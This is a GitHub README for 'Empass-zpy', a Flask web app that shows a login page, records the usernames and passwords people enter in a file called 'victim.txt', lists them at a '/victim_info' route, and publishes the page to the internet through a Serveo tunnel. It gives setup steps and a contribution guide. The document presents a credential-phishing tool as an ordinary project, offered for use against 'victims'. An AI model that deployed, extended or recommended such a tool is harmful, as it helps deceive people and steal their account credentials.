# Empass-zpy

## About
This is a simple web application built with Flask that allows users to log in and stores their login information. It also includes a mechanism to expose the app to the internet using Serveo.

## Features
- User login functionality with username and password.
- Data logging of login information to a file.
- Exposes the app to the internet via Serveo, making it accessible remotely.

## Installation
1. Clone the repository to your local machine:

    ```bash
    git clone https://github.com/Poxlm/Empass-zpy.git
    cd Empass-zpy
    ```

2. Install the required dependencies. It's recommended to create a virtual environment first:

    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows, use: venv\Scripts\activate
    pip install flask
    ```

3. Start the Flask app and expose it using Serveo:

    - Run the `run.py` script:
    
        ```bash
        python run.py
        ```

    - Follow the prompts to specify the port and Serveo subdomain.

4. Your Flask app is now running, and you can access it via the Serveo subdomain.

## Usage
- Access the app in your web browser by visiting the Serveo subdomain you provided during installation.
- You can log in with a username and password.
- Login information is stored in a file named 'victim.txt'.
- To view the stored login information, go to `/victim_info` on the web app.

## Contribution
If you'd like to contribute to this project, please follow these steps:

1. Fork the repository on GitHub.

2. Clone your fork to your local machine:

    ```bash
    git clone https://github.com/Poxlm/Empass-zpy.git
    cd Empass-zpy
    ```

3. Create a new branch for your feature or bug fix:

    ```bash
    git checkout -b feature/new-feature
    ```

4. Make your changes, commit them, and push to your fork:

    ```bash
    git add .
    git commit -m "Added a new feature"
    git push origin feature/new-feature
    ```

5. Open a pull request on the original repository to merge your changes.

## License
This project is licensed under the [MIT License](LICENSE).

